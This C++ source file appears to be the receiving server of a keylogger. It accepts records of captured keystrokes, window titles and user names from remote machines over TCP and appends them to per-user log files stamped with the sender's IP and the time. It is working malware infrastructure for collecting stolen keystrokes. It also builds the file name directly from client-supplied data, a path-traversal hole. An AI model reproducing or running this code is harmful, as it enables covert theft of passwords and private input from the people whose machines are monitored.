#include "common.hpp"
#include "MindServer.h"


MindServer::MindServer(boost::asio::io_service& io_service, unsigned short port)
: _acceptor(io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
{
    std::cout << "Listening...\n";
    ConnectionPtr newConn = std::make_shared<connection>(_acceptor.get_io_service());

    _acceptor.async_accept(newConn->socket(), boost::bind(&MindServer::HandleAccept, this, boost::asio::placeholders::error, newConn));
};

MindServer::~MindServer()
{
}

void MindServer::HandleAccept(const boost::system::error_code& e, ConnectionPtr conn)
{
    if (!e)
        conn->async_read(_receivedData, boost::bind(&MindServer::HandleRead, this, boost::asio::placeholders::error, conn));
    else
        std::cerr << "Exeption: " << e.message().c_str() << std::endl;

    ConnectionPtr new_conn(new connection(_acceptor.get_io_service()));
    _acceptor.async_accept(new_conn->socket(), boost::bind(&MindServer::HandleAccept, this, boost::asio::placeholders::error, new_conn));
}

void MindServer::HandleRead(const boost::system::error_code& e, ConnectionPtr conn)
{
    if (!e)
    {
        std::cout << "Update from IP: " << conn->socket().remote_endpoint().address().to_string().c_str() << ", Size: " << _receivedData.size() << "\n";
        SaveData(conn);
    }
    else
        std::cerr << "Exeption: " << e.message().c_str() << std::endl;
}

void MindServer::SaveData(ConnectionPtr conn)
{
    if (_receivedData.size() <= 0)
    {
        std::cerr << "Error: " << "Data received, but empty?" << std::endl;
        return;
    }

    time_t currTime = time(NULL);
    std::string stringDate = ctime(&currTime);
    stringDate[stringDate.size() - 1] = 0; // Erase an new line.

    std::string fileName = _receivedData[0].User + ".txt";

    std::cout << "Update file: " << fileName.c_str() << "\n";

    std::ofstream myfile;
    myfile.open(fileName.c_str(), std::ios::out | std::ios::app);

    std::string lastWindowTitle = _receivedData[0].WindowTitle;

    myfile << "----- BEGIN DATA, DATE: " << stringDate.c_str() << " -----\n";
    myfile << "From: " << conn->socket().remote_endpoint().address().to_string() << "\n";
    myfile << "Title: " << _receivedData[0].WindowTitle << "\n";
    myfile << "Data: ";

    for (auto &receivedData : _receivedData)
    {
        if (receivedData.WindowTitle == lastWindowTitle)
            myfile << receivedData.Key;
        else
        {
            myfile << "\n----------\n";
            myfile << "Title: " << receivedData.WindowTitle << "\n";
            myfile << "Data: ";
            lastWindowTitle = receivedData.WindowTitle;
        }
    }
    myfile << "\n----- END DATA -----\n\n";

    myfile.close();
}
